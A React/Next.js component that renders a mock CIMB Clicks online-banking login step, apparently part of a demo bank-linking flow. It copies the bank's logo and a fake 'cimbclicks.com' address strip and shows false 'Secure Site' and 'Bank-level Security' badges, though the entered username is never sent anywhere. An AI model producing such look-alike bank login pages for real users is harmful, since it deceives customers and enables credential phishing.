'use client'

import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Button } from '@/components/ui/button'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Shield, AlertTriangle, ExternalLink, Lock } from 'lucide-react'
import React, { useState } from 'react'
import { bankData,pendingbankData}  from '../../../data/banks/banks'
import Router, { useRouter } from 'next/navigation'

import Image from 'next/image'



export default function Link() {
const router = useRouter();
  const [username, setUsername] = useState('')
  const [isLoading, setIsLoading] = useState(false)


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    // Simulate API call
    

    // Add to bankData
    bankData.push(...pendingbankData)
    pendingbankData.length = 0;
    console.log("Updated bankData:", bankData);
    setIsLoading(false)
    // Here you can add navigation logic
    router.push("/confirmation")
  }

  return (
    <section className='bg-[radial-gradient(ellipse_200%_100%_at_bottom_left,#183EC2,#EAEEFE_100%)] overflow-x-clip min-h-screen w-full'>
      <div className='container flex flex-col items-center justify-center min-h-screen mx-auto px-4 py-16 md:py-24'>
        <div className='w-full max-w-md'>
          <div className='bg-white'>
            {/* Header */}
            <div className='w-full bg-red-600 px-6 py-3 flex items-center justify-between'>
              <div className='flex items-center gap-2'>
                <Image
                  src="/cimb.png"
                  alt="CIMB Logo"
                  width={24}
                  height={24}
                  className="rounded"
                />
                <p className='text-white font-medium'>cimbclicks.com</p>
              </div>
              <Lock className="text-white h-4 w-4" />
            </div>

            <div className='p-6 md:p-8 space-y-8'>
              <div className='space-y-2 text-center'>
                <h1 className='text-xl md:text-2xl font-bold text-black'>
                  Log in to CIMB Clicks Online Banking
                </h1>
                <div className='flex items-center justify-center gap-2 text-green-800'>
                  <Shield className="h-4 w-4" />
                  <p className='text-sm'>You are in a Secure Site</p>
                </div>
              </div>

              <form onSubmit={handleSubmit} className='space-y-6'>
                <div className='space-y-2'>
                  <Label htmlFor="username" className="text-black">
                    Username:
                  </Label>
                  <div className='flex gap-2'>
                    <Input
                      id="username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="bg-white/10 border-black/20 text-black placeholder:text-white/50"
                      placeholder="Enter your username"
                      required
                    />
                    <Button 
                      type="submit" 
                      className="bg-red-600 hover:bg-red-700 text-white"
                      disabled={isLoading}
                    >
                      {isLoading ? "Loading..." : "Next"}
                    </Button>
                  </div>
                </div>

                <div className='space-y-2 text-sm text-black/80'>
                  <p>Don't have a CIMB Clicks Account?</p>
                  <p>
                    <a href="#" className='text-blue-400 hover:text-blue-300 flex items-center gap-1'>
                      Click here <ExternalLink className="h-3 w-3" />
                    </a>
                    {' '}for information on opening an account
                  </p>
                </div>

                <Alert className="bg-white/10 border-amber-500/50">
                  <AlertTriangle className="h-4 w-4 text-amber-500" />
                  <AlertDescription className="text-black">
                    <p className='font-bold mb-2'>Security Information</p>
                    <ul className='list-disc pl-4 space-y-1 text-sm'>
                      <li>Click here for security tips</li>
                      <li>Never login via email links</li>
                      <li>Never reveal your PIN and/or Password to anyone</li>
                    </ul>
                  </AlertDescription>
                </Alert>

                <Alert className="bg-white/10 border-blue-500/50">
                  <AlertDescription className="text-black text-sm">
                    To report any suspicious websites or transactions, please call our fraud hotline.
                  </AlertDescription>
                </Alert>
              </form>
            </div>
          </div>

          {/* Footer Security Indicators */}
          <div className='mt-6 flex items-center justify-center gap-4'>
            <div className='flex items-center gap-2 text-white/80 text-sm'>
              <Lock className="h-4 w-4" />
              <span>Secure Connection</span>
            </div>
            <div className='flex items-center gap-2 text-white/80 text-sm'>
              <Shield className="h-4 w-4" />
              <span>Bank-level Security</span>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}